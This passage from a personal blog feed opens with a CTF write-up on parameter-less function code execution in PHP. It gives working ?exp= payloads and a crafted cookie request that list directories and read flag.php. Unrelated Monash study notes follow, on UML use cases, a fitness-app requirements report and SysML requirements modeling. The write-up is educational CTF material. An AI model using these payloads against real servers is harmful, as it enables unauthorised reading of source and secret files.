<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   print_r(localeconv());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lv9buj30n90asaay.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lv9buj30n90asaay.jpg" class="lazyload"></a></p>
<p><code>current(localeconv())</code> 永远都是个点</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>由于php数组内部指针默认指向第一个元素，所以 <code>current()</code> 或 <code>pos()</code> 取数组中当前元素的值<br>通过上图可知，字符串首位为 <code>.</code>，结合曾经分析的 <a href="https://www.suk1.top/2019/01/22/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/">php 弱类型</a>，可以知道数组字符串改成浮点型判定，以此构造函数利用，得到最终所期望得到的 <code>.</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ltceej30eo07y3yl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ltceej30eo07y3yl.jpg" class="lazyload"></a></p>
<hr>
<h3 id="通过利用-phpversion-进行无参数函数利用"><a href="#通过利用-phpversion-进行无参数函数利用" class="headerlink" title="通过利用 phpversion() 进行无参数函数利用"></a>通过利用 phpversion() 进行无参数函数利用</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure></div>

<p>上面这个命令执行也可以遍历当前目录，下面的是在本地搭了环境测试的不同函数回显结果</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">phpversion()   回显 string(11) &quot;7.3.10-1+b1&quot;</span><br><span class="line">floor(phpversion())   回显 float(7) </span><br><span class="line">sqrt(floor(phpversion()))  回显 float(2.6457513110646) </span><br><span class="line">tan(floor(sqrt(floor(phpversion())))) 回显 float(-2.1850398632615) </span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion()))))) 返回4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion())))))) 返回45.081318677156</span><br><span class="line"></span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</span><br><span class="line">回显 46</span><br><span class="line"></span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</span><br><span class="line">回显 string(1) &quot;.&quot; </span><br><span class="line"></span><br><span class="line">next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</span><br><span class="line">回显 string(2) &quot;..&quot; </span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))))  这个没有</span><br><span class="line"></span><br><span class="line">chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))</span><br><span class="line">回显 bool(true) </span><br><span class="line"></span><br><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))); 这个没测出来，大佬说是下面这种情况</span><br><span class="line">hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</span><br><span class="line"></span><br><span class="line">readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">回显了index的源码</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="如何得到flag-php"><a href="#如何得到flag-php" class="headerlink" title="如何得到flag.php"></a>如何得到flag.php</h2><p>如上，先利用 <code>current(localeconv())</code> 得到当前目录</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvjkoj30np050aa8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvjkoj30np050aa8.jpg" class="lazyload"></a></p>
<p>可以看到 <code>flag.php</code> 是倒数第二个值，假设是倒数第一个我们可以用end()，但是并没有一个操作数组的函数能够输出数组的倒数第二个值。如何解决，看了大佬的文章总结些方法</p>
<h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h3><p>以相反的元素顺序返回数组</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ludy6j30pi04zq34.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ludy6j30pi04zq34.jpg" class="lazyload"></a></p>
<p>然后通过操作数组的方法，<code>next()</code> 将内部指针指向数组中的下一个元素并输出<br><code>next(array_reverse(scandir(pos(localeconv()))))</code> 就得到了 <code>flag.php</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lulfxj30oy04rglo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lulfxj30oy04rglo.jpg" class="lazyload"></a></p>
<hr>
<h3 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a>array_rand(array_flip())</h3><p><code>array_flip()</code> 交换数组的键和值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=var_dump(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lyzeij30xg04aaaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lyzeij30xg04aaaa.jpg" class="lazyload"></a></p>
<p><code>array_rand()</code> 从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中<code>scandir()</code>返回的数组只有5个元素，刷新几次就能刷出来 <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=var_dump(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1m1gymj30ql04qwek.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1m1gymj30ql04qwek.jpg" class="lazyload"></a></p>
<hr>
<h3 id="session-id-session-start"><a href="#session-id-session-start" class="headerlink" title="session_id(session_start())"></a>session_id(session_start())</h3><p>通过飘零师傅的文章可以知道，题目虽然ban了 <code>hex</code> 关键字，导致 <code>hex2bin()</code> 被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为 <code>flag.php</code> 这些字符是 <code>PHPSESSID</code> 本身就支持的。</p>
<p>使用 <code>session</code>之前需要通过 <code>session_start()</code> 告诉PHP使用session，php默认是不主动使用session的。</p>
<p><code>session_id()</code> 可以获取到当前的session id。</p>
<p>因此我们手动设置名为 <code>PHPSESSID</code> 的cookie，并设置值为 <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?exp=readfile(session_id(session_start()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=flag.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1miai4j311o0av773.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1miai4j311o0av773.jpg" class="lazyload"></a></p>
<hr>
<h2 id="其余的payload"><a href="#其余的payload" class="headerlink" title="其余的payload"></a>其余的payload</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</span><br><span class="line">pos() current() 都行</span><br><span class="line"></span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></div>


<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">飘零师傅: PHP Parametric Function RCE</a><br><a href="https://www.gem-love.com/websecurity/530.html">简析GXY_CTF “禁止套娃”无参数RCE</a><br><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">无参数函数RCE</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>Use several UML analysis techniques to produce a report</title>
    <url>/yakko117/2023/04/19/Modelling_report_analysis/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="叙述"><a href="#叙述" class="headerlink" title="叙述"></a>叙述</h1><p>基于对任务的理解，给出可能的解决方案，要包含对解决问题的范围，以及客户为解决方案需要提供的任何信息。 </p>
<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol>
<li>use case digram 用例图 </li>
<li>use case description 用例描述 </li>
<li>Domain Class Diagram 领域类图 </li>
<li>Activity Diagram 活动图 </li>
<li>System Sequence Diagram 系统时序图</li>
</ol>
<h2 id="注册和个人简介"><a href="#注册和个人简介" class="headerlink" title="注册和个人简介"></a>注册和个人简介</h2><p>每个用户都需要注册，并创建个人简介。用户可以选择填写一些健康和人口统计信息，如年龄、性别、地点、体重和身高，并指定一些健身目标。 </p>
<p>Each user needs to register and create a personal profile. Users can choose to fill in some health and demographic information, such as age, gender, location, weight, and height, and specify some fitness goals. </p>
<h2 id="健康日记"><a href="#健康日记" class="headerlink" title="健康日记"></a>健康日记</h2><p>用户可以在健康日记中记录各种健身活动和测量结果，例如体重、腰围、血压、静息心率等。用户还可以添加基于文本的日记条目，并附加照片或视频。日记条目应该像其他社会媒体网站，如 Facebook 上的帖子。用户也应该能够对彼此的条目进行评论。 </p>
<p>Users can record various fitness activities and measurement results in their health diary, such as weight, waist circumference, blood pressure, resting heart rate, etc. Users can also add text based journal entries and attach photos or videos. Diary entries should resemble posts on other social media websites, such as Facebook. Users should also be able to comment on each other’s entries. </p>
<h2 id="手动输入和设备同步"><a href="#手动输入和设备同步" class="headerlink" title="手动输入和设备同步"></a>手动输入和设备同步</h2><p>用户可以手动添加一个条目到他们的日记。他们还应该能够编辑或删除他们所做的任何条目。此外，移动应用程序需要接受来自健身设备的数据，并在同步时自动为设备捕获的活动或测量创建日记条目。 </p>
<p>Users can manually add an entry to their diary. They should also be able to edit or delete any entries they make. In addition, mobile applications need to accept data from fitness devices and automatically create diary entries for activities or measurements captured by the device during synchronization. </p>
<h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><p>用户可以搜索其他用户并与之建立联系。连接请求需要得到接收请求的用户的批准。连接的用户将在他们的“订阅源”中看到彼此的“日记条目”，允许他们对这些条目发表评论。 </p>
<p>Users can search for other users and establish contact with them. The connection request requires approval from the user receiving the request. Connected users will see each other’s “diary entries” in their “feed”, allowing them to comment on these entries. </p>
<h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><p>用户可以创建报告来跟踪性能和测量结果。移动应用程序支持一系列报告，例如燃烧的卡路里总数，或每周的距离。随着时间的推移，报告可能是用户日记中记录的简单测量，如体重或血压。 </p>
<p>Users can create reports to track performance and measurement results. The mobile application supports a series of reports, such as the total number of calories burned or the distance per week. Over time, reports may be simple measurements recorded in user diaries, such as weight or blood pressure. </p>
<h2 id="实施阶段"><a href="#实施阶段" class="headerlink" title="实施阶段"></a>实施阶段</h2><p>该公司只考虑开发移动应用程序。尽管这需要与索赔处理系统集成才能反映折扣，但第一阶段的实施却忽视了这些折扣。第二阶段将涵盖整合方面。 </p>
<p>The company only considers developing mobile applications. Although this requires integration with the claims processing system to reflect discounts, the implementation of the first phase overlooked these discounts. The second phase will cover the integration aspect. </p>
<hr>
<h1 id="用例描述"><a href="#用例描述" class="headerlink" title="用例描述"></a>用例描述</h1><h2 id="Record-Fitness-Activity（记录健身活动）"><a href="#Record-Fitness-Activity（记录健身活动）" class="headerlink" title="Record Fitness Activity（记录健身活动）"></a>Record Fitness Activity（记录健身活动）</h2><p>场景：用户在健身后打开应用程序，并选择“记录健身活动”用例。他们选择所进行的活动类型（如跑步、骑自行车、游泳），并输入相关信息（如距离、时间、地点等）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
<p>前置条件：用户已经下载并注册了健康生活应用程序，并且具有健身活动可以记录。 </p>
<h2 id="Record-Health-Measurements（记录健康指标）"><a href="#Record-Health-Measurements（记录健康指标）" class="headerlink" title="Record Health Measurements（记录健康指标）"></a>Record Health Measurements（记录健康指标）</h2><p>场景：用户打开应用程序，并选择“记录健康指标”用例。他们选择所记录的指标类型（如体重、血压、静息心率），并输入相关数据（如数值和日期）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
<p>前置条件：用户已经下载并注册了健康生活应用程序，并且需要记录某些健康指标。 </p>
<h2 id="Connect-with-Friends（连接朋友）"><a href="#Connect-with-Friends（连接朋友）" class="headerlink" title="Connect with Friends（连接朋友）"></a>Connect with Friends（连接朋友）</h2><p>场景：用户想要与其他健康生活应用程序用户建立联系。他们打开应用程序并选择“连接朋友”用例。用户可以搜索其他用户，并向他们发送连接请求。如果请求被接受，用户可以查看彼此的日记条目，并互相喜欢、评论和分享条目。 </p>
<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要连接其他用户。 </p>
<h2 id="View-Progress-and-Reports（查看进展和报告）"><a href="#View-Progress-and-Reports（查看进展和报告）" class="headerlink" title="View Progress and Reports（查看进展和报告）"></a>View Progress and Reports（查看进展和报告）</h2><p>场景：用户想要查看他们的进展和生成报告。他们打开应用程序，并选择“查看进展和报告”用例。应用程序将为他们生成有关他们的日记条目、健身活动和健康指标的报告，并允许用户跟踪他们的进展。 </p>
<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要查看他们的进展和报告。 </p>
<h2 id="Healthy-Living-App（健康生活应用程序）"><a href="#Healthy-Living-App（健康生活应用程序）" class="headerlink" title="Healthy Living App（健康生活应用程序）"></a>Healthy Living App（健康生活应用程序）</h2><p>场景：用户打开健康生活应用程序，并使用其各种功能。这包括记录健身活动、记录健康指标、连接其他用户、查看进展和报告等。 </p>
<p>前置条件：用户已经下载并注册了健康生活应用程序，并且想要使用它的各种功能。 </p>
<h2 id="class-diagram-amp-domain-class-diagram"><a href="#class-diagram-amp-domain-class-diagram" class="headerlink" title="class diagram &amp; domain class diagram"></a>class diagram &amp; domain class diagram</h2><p>A class diagram is a diagram that illustrates the classes, interfaces, and their relationships in a system. It provides an overview of the system’s objects, attributes, methods, and associations.<br>类图(Class Diagram)是一种图表，它展示了系统中类、接口及它们之间的关系。它提供了系统对象、属性、方法和关联的概览。</p>
<p>A domain class diagram, on the other hand, is a type of class diagram that focuses specifically on the objects and classes in a particular domain. The domain is a specific area of knowledge or expertise, such as accounting, medicine, or engineering. In a domain class diagram, only the classes that are relevant to that domain are included, and relationships between those classes are defined in terms of the domain’s concepts and terminology.<br>领域类图(Domain Class Diagram)则是一种特定类型的类图，它专注于某个特定领域中的对象和类。领域是特定的知识或专业领域，例如会计、医学或工程学。在领域类图中，只包括与该领域相关的类，并且这些类之间的关系以该领域的概念和术语来定义。</p>
<h3 id="The-main-differences"><a href="#The-main-differences" class="headerlink" title="The main differences"></a>The main differences</h3><p><code>Scope</code>: A domain class diagram has a <code>narrower</code> scope than a class diagram. It focuses only on the classes that are relevant to a specific domain.</p>
<p><code>Terminology</code>: A domain class diagram uses the terminology of the domain it represents, while a class diagram may use more general terminology.</p>
<p><code>Abstraction</code>: A domain class diagram may be more abstract than a class diagram, as it may leave out details that are not relevant to the domain.</p>
<p><code>Purpose</code>: A domain class diagram is designed to help people understand the relationships between classes within a specific domain, while a class diagram is designed to provide an overview of the classes, interfaces, and their relationships in a system.</p>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Paper Note Taking</tag>
      </tags>
  </entry>
  <entry>
    <title>User requirements modeling and analysis of software-intensive systems</title>
    <url>/yakko117/2023/03/23/Modelling_paper_note_taking/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://doi.org/10.1016/j.jss.2010.10.020">https://doi.org/10.1016/j.jss.2010.10.020</a><br>Author: <em>Michel dos Santos Soares, Jos Vrancken, Alexander Verbraeck</em><br><em>Delft University of Technology</em></p>
<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>根据用户需求开发(user requirements development)，记录和分析软件密集型系统的用户需求的活动。<br>对进一步的需求工程活动有用的建模活动。当前的需求建模技术存在许多问题和局限性。因此进行改进，作者提出了需求建模语言的需求列表。</p>
<p>主要展示 SysML 图表和表格的一些扩展如何满足其中的大部分要求。</p>
<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Requirements<br>UML<br>SysML (Systems Modeling Language)<br>Software-intensive systems</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Software-intensive systems 软件密集型系统<br>如何改进软件密集型系统的用户需求建模和分析？<br>How to improve user requirements modeling and analysis for software-intensive systems?</p>
<p>E.g.<br>RTMS &#x3D; Road Traffic Management System</p>
<ul>
<li>List of requirements</li>
</ul>
<p><strong>Requirements modeling approaches</strong></p>
<ul>
<li>graphics-based 图形</li>
<li>purely textual 纯文本</li>
<li>combination of both</li>
</ul>
<p>The most common approach is to write user requirements using <em>natural language</em>.<br>However, problems such as imprecision, misunderstandings, ambiguity and inconsistency are common when natural language is used (Kamsties, 2005)</p>
<p>SysML 需求图有助于更好地组织需求，还可以明确显示不同需求之间的各种关系。<br>The SysML Requirements diagram helps in better organizing requirements, and also shows explicitly the various kinds of relationships between different requirements. </p>
<p>(M) must (S)should</p>
<p><strong>Information Function</strong></p>
<table>
<thead>
<tr>
<th>UML</th>
<th>sysML</th>
</tr>
</thead>
<tbody><tr>
<td>缺点：抽象，难以映射到现实系统</td>
<td>缺点：应用范围相对较窄，主要适用于大型、复杂系统的建模。</td>
</tr>
<tr>
<td>缺点： 语法存在歧义难以理解，容易导致建模错误，同时需要专业知识背景，或相应知识学习</td>
<td>缺点：单一方面专业性较强，对于一般软件工程师来说学习和应用门槛较高。</td>
</tr>
<tr>
<td>优点：通用的建模语言，可以用于多种软件系统，具有广泛的适用性</td>
<td>缺点：应用范围相对较窄，主要适用于大型、复杂系统的建模。</td>
</tr>
<tr>
<td>优点：提供了丰富的建模工具和概念，如类图、对象图、顺序图、活动图、状态图等等，可以覆盖多种软件系统的建模需求。</td>
<td></td>
</tr>
</tbody></table>
<p>Clearly display user needs in a visual form</p>
<ul>
<li>User requirements are expressed in tabular form.</li>
<li>Understand what happens when relevant requirements are changed or deleted.</li>
<li>Use case diagrams to represent the actors involved and the scenarios to be implemented.</li>
</ul>
<p>There are several approaches to modeling requirements. Basically, these approaches can be classified as graphics-based, purely textual, or a combination of both. Some are generic while others are part of a specific methodology. The most common approach is to write user requirements using natural language. However, problems such as imprecision, misunderstandings, ambiguity and inconsistency are common when natural language is used. To solve these problems, structured natural language is used. SysML is a good example of this. (表)<br>有几种建模需求的方法。 基本上，这些方法可以分为基于图形的、纯文本的或两者的结合。 有些是通用的，而另一些是特定方法的一部分。 最常见的方法是使用自然语言编写用户需求。 然而，在使用自然语言时，不精确、误解、歧义和不一致等问题很常见。 为了解决这些问题，使用了结构化的自然语言。 SysML 就是一个很好的例子。 (表示)</p>
<p>This list of requirements required for requirements modeling languages is given, as well as mappings of common languages and technologies. From the table, it is clear that “Must have” requirements, such as “Priority between requirements”, “Requirements risks”, “Identify types of requirements”, and “Ranking requirements by stability” are partially addressed or not addressed at all by most of the studied requirements modeling languages. And another conclusion from the table is that some “Must have” requirements and the majority of “Should have” requirements are fulfilled or at least partially fulfilled by a combination of the SysML Requirements diagram and SysML Tables. （图）<br>给出了需求建模语言所需的需求列表，以及通用语言和技术的映射。 从表中可以清楚地看出，“必须有”需求，如“需求之间的优先级”、“需求风险”、“识别需求类型”和“按稳定性对需求进行排名”等，部分解决或根本没有解决 大多数研究过的需求建模语言。 从该表中得出的另一个结论是，通过 SysML 需求图和 SysML 表的组合，可以满足或至少部分满足一些“必须具备”的要求和大部分“应该具备”的要求。 （图）</p>
<p>To better understand the relationship between requirements. SYsML extends the hierarchy and derived relationships that connect to requirements and represent dependencies between requirements and models. This can effectively reduce the ambiguity generated by the statement. (图)<br>更好地理解需求之间的关系。 SYsML 扩展了连接到需求并表示需求和模型之间依赖关系的层次结构和派生关系。 这样可以有效减少语句产生的歧义。 (图)</p>
<p>At the same time, SysML has also expanded additional properties, including risk assessment, which is used to assess the impact of risks on project objectives. The specific approach is to add a tuple to the requirement, including the impact of probability and risk.<br>同时，SysML 还扩展了额外的属性，包括风险评估，用于评估风险对项目目标的影响。 具体做法是在需求中增加一个元组，包括概率和风险的影响。</p>
<h2 id="The-analysis-of-SysML-Requirements-diagram"><a href="#The-analysis-of-SysML-Requirements-diagram" class="headerlink" title="The analysis of SysML Requirements diagram:"></a>The analysis of SysML Requirements diagram:</h2><ul>
<li>Better to organize requirements</li>
<li>Creating a clear overview of system structure → manage size and complexity more easily<br>创建清晰的系统结构概览 → 更轻松地管理规模和复杂性</li>
<li>Facilitating problem-solving and system scaling<br>促进问题解决和系统扩展</li>
<li>Use Case diagrams lack well-defined semantics<ul>
<li>E.g. the include and extend relationships are considered similar (Jacobson, 2004).</li>
</ul>
</li>
<li>Issues of imprecision, misunderstanding, ambiguity and inconsistency are reduced (Kamsties, 2005).<ul>
<li>E.g. Ambiguity can be solved with the use of formal methods (Hinchey et al., 2008)</li>
</ul>
</li>
</ul>
<p>Iterative development: The Requirements Diagram can be used to support an iterative development process, where requirements are refined and updated over time. This helps ensure that the system meets evolving needs and can adapt to changing circumstances.<br>迭代开发：需求图可用于支持迭代开发过程，在该过程中，需求会随着时间的推移而细化和更新。 这有助于确保系统满足不断变化的需求并能够适应不断变化的环境。</p>
<p>System scaling: The Requirements Diagram can be used to identify areas where the system can be scaled or extended to meet new requirements or accommodate future growth. This helps ensure that the system can continue to meet the needs of stakeholders over time.<br>系统扩展：需求图可用于确定可以扩展或扩展系统以满足新需求或适应未来增长的区域。 这有助于确保系统能够随着时间的推移继续满足利益相关者的需求。</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><ul>
<li>In system development, the use of SysML requirement diagrams can be a good response to requirements changes.</li>
<li>proposed classification of user requirements, and then draw the SysML Requirements diagram, and based on UML extended with new stereotypes<ul>
<li>The scope of adaptation of sysML is not as wide as that of UML. Due to its professionalism, it will be carried out in a more refined direction.</li>
</ul>
</li>
<li>when using formal methods, other properties, such as “human readable” may be lost (the function should be improved)</li>
</ul>
<h2 id="Use-Case-Diagram"><a href="#Use-Case-Diagram" class="headerlink" title="Use Case Diagram"></a>Use Case Diagram</h2><p>Use Case Diagram in SysML is a graphical representation of the interactions between actors (users or other systems) and a system, depicting the functional requirements of the system.<br>SysML 中的用例图是参与者（用户或其他系统）与系统之间交互的图形表示，描述了系统的功能需求。</p>
<p>Use Case Diagrams are used to communicate with stakeholders about the functional requirements of a system. They help to identify the system’s behavior and its interactions with other systems or users. The diagram can be used to describe the scope of the system, the actors involved, and the relationships between them, which helps to identify potential issues or requirements that may have been overlooked.<br>用例图用于与利益相关者就系统的功能需求进行沟通。 它们有助于识别系统的行为及其与其他系统或用户的交互。 该图可用于描述系统的范围、涉及的参与者以及它们之间的关系，这有助于识别可能被忽略的潜在问题或需求。</p>
<h2 id="Requirements-Diagram"><a href="#Requirements-Diagram" class="headerlink" title="Requirements Diagram"></a>Requirements Diagram</h2><p>Requirements Diagram in SysML is a graphical representation of the requirements for a system. It provides a structured way to capture and organize requirements, which can help to ensure that all stakeholders have a clear understanding of the system’s needs and goals.<br>SysML 中的需求图是系统需求的图形表示。 它提供了一种结构化的方式来捕获和组织需求，这有助于确保所有涉众都清楚地了解系统的需求和目标。</p>
<p>The Requirements Diagram typically consists of several parts, including requirements, requirements categories, and requirement relationships. Requirements are represented as rectangular shapes, and each requirement is labeled with a unique identifier and a brief description. Requirements categories are used to group related requirements together, and relationships between requirements are used to show dependencies and interactions between them.<br>需求图通常由几个部分组成，包括需求、需求类别和需求关系。 需求以矩形表示，每个需求都标有唯一标识符和简短描述。 需求类别用于将相关需求分组在一起，需求之间的关系用于显示它们之间的依赖关系和相互作用。</p>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Paper Note Taking</tag>
      </tags>
  </entry>
  <entry>
    <title>Monash Courses 2023S1 FIT9130</title>
    <url>/yakko117/2023/03/01/MonashCs9130/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>要考试，感觉是纯理论性质的课程，希望能拿HD</p>
<h1 id="FIT9130-系统分析与设计"><a href="#FIT9130-系统分析与设计" class="headerlink" title="FIT9130 系统分析与设计"></a>FIT9130 系统分析与设计</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>有考试，有paper，好好理解好好学</p>
<h3 id="Conception"><a href="#Conception" class="headerlink" title="Conception"></a>Conception</h3><ol>
<li><p><strong><font color="red">What is information system?</font></strong></p>
